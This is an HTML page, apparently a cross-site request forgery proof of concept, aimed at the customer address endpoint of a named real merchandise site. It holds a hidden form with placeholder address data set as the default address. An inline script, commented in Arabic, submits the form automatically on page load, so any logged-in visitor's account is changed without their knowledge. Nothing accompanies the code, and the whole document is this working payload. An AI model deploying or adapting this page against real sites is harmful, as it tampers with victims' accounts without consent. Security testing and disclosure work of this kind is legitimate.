<html>
  <body>
    <form id="csrf-form" action="https://merchandise.ford.com/account/addresses" method="POST">
      <input type="hidden" name="form_type" value="customer_address">
      <input type="hidden" name="utf8" value="✓">
      
      <input type="hidden" name="address[default]" value="1">
      <input type="hidden" name="address[first_name]" value="look">
      <input type="hidden" name="address[last_name]" value="up">
      <input type="hidden" name="address[company]" value="ll">
      <input type="hidden" name="address[address1]" value="876 mnhgtr">
      <input type="hidden" name="address[city]" value="makkjj">
      <input type="hidden" name="address[province]" value="Alabama">
      <input type="hidden" name="address[zip]" value="35004">
      <input type="hidden" name="address[country]" value="United States">
      <input type="hidden" name="address[phone]" value="1234567890">

      <input type="submit" value="Submit Request">
    </form>

    <script>
      // التأكد من تحميل الصفحة ثم إرسال النموذج تلقائياً
      window.onload = function() {
        document.getElementById('csrf-form').submit();
      };
    </script>
  </body>
</html>
